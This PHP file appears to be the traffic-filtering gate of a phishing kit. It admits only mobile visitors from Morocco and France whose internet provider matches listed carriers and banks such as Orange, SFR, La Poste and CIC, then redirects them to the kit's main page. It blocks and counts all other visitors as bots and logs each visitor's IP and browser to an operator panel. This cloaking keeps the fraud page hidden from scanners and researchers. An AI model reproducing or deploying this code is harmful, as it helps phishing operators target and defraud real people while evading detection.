<?php
// Include security measures to prevent certain attacks
include './prevents/anti.php';

// Include configuration settings
include_once "app/config/panel.php";

function update_ini($data, $file)
{
    $content = "";
    $parsed_ini = parse_ini_file($file, true);
    foreach ($data as $section => $values) {
        if ($section === "") {
            continue;
        }
        $content .= $section . "=" . $values . "\n\r";
    }
    if (!$handle = fopen($file, 'w')) {
        return false;
    }
    $success = fwrite($handle, $content);
    fclose($handle);
}

if (PHONE) {
    // Check if the user agent is from a mobile device
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $mobile_keywords = ["Mobile", "Android", "iPhone", "Windows Phone", "Opera Mini", "IEMobile", "BlackBerry"];
    $is_mobile = false;
    foreach ($mobile_keywords as $keyword) {
        if (stripos($user_agent, $keyword) !== false) {
            $is_mobile = true;
            break;
        }
    }
    if (!$is_mobile) {
        $file = './app/Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['bots']++;
        update_ini($data, $file);
        die("Access denied. Mobile devices only.");
    }
    }

    function get_client_ip() {
        $ip = null;
        foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $header) {
            if (array_key_exists($header, $_SERVER) === true) {
                foreach (explode(',', $_SERVER[$header]) as $potential_ip) {
                    $potential_ip = trim($potential_ip);
                    if (filter_var($potential_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                        $ip = $potential_ip;
                        break 2;
                    }
                }
            }
        }
        return ($ip !== null) ? $ip : '127.0.0.1';
    }

// Array of allowed countries
$allowed = [
    "MA",
    "FR",
];

// Function to retrieve IP information from external API
function getIpInfo($ip = '') {
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

if (TESTMODE) {
    $visitorip = "128.78.14.206";
    $ipinfo_json = getIpInfo($visitorip);
} else {
    $visitorip = get_client_ip();
    $ipinfo_json = getIpInfo($visitorip);
}

// Extract relevant IP information
$status = "{$ipinfo_json['status']}";
$CountryCode = "{$ipinfo_json['countryCode']}";
$org = "{$ipinfo_json['as']}";
$isps = "{$ipinfo_json['isp']}";
$count = "{$ipinfo_json['country']}";
$date = date('Y-m-d H:i:s');
$ip = get_client_ip();
$agent = $_SERVER['HTTP_USER_AGENT'];

// Construct a table row for logging
$str = "<tr><th scope='row'>$ip</th><td>$agent</td><td>$date</td><td>$org</td><td>$count</td></tr>";
file_put_contents('./visitors.html', $str, FILE_APPEND | LOCK_EX);

$file = 'app/Panel/stats/stats.ini';
$data = @parse_ini_file($file);
$data['clicks']++;
update_ini($data, $file);

// Check if IP information retrieval was successful
if ($status == "success") {
    // Define operators by country
    $operatorsByCountry = array(
        "FR" => array("bouygues", "orange", "sfr", "free", "wanadoo", "proximus", "laposte", "nrj", "sosh", "coriolis", "cic", "poste", "mutuel", "numericable"),
        "MA" => array("meditelecom"),
    );

    // Check if the country is allowed
    if (count($allowed) > 0 && !in_array($CountryCode, $allowed)) {

        $file = 'app/Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['bots']++;
        update_ini($data, $file);
        die("COUNTRY NOT ALLOWED");
    }

    // Check if the country has specific operators
    if (array_key_exists($CountryCode, $operatorsByCountry)) {
        $operatorsForCountry = $operatorsByCountry[$CountryCode];

        // Loop through operators for the country
        foreach ($operatorsForCountry as $operator) {
            // Check if the organization matches an allowed operator
            if (stripos(strtolower($org), strtolower($operator)) !== false) {
                $_SESSION['Xx212A6M'] = true;
                header("Location: app/index.php?view=main&id=".md5(time()));
                exit();
            }
        }
    } else {
        $file = 'app/Panel/stats/stats.ini';
        $data = @parse_ini_file($file);
        $data['bots']++;
        update_ini($data, $file);
    die("THE REQUEST WAS DENIED: "." | ". $visitorip ." | ". $org);
    }


} else {
    $file = 'app/Panel/stats/stats.ini';
    $data = @parse_ini_file($file);
    $data['bots']++;
    update_ini($data, $file);
    // Handle the case where IP information retrieval fails
   die('Failed to retrieve IP information.'. $visitorip);
}
?>

?>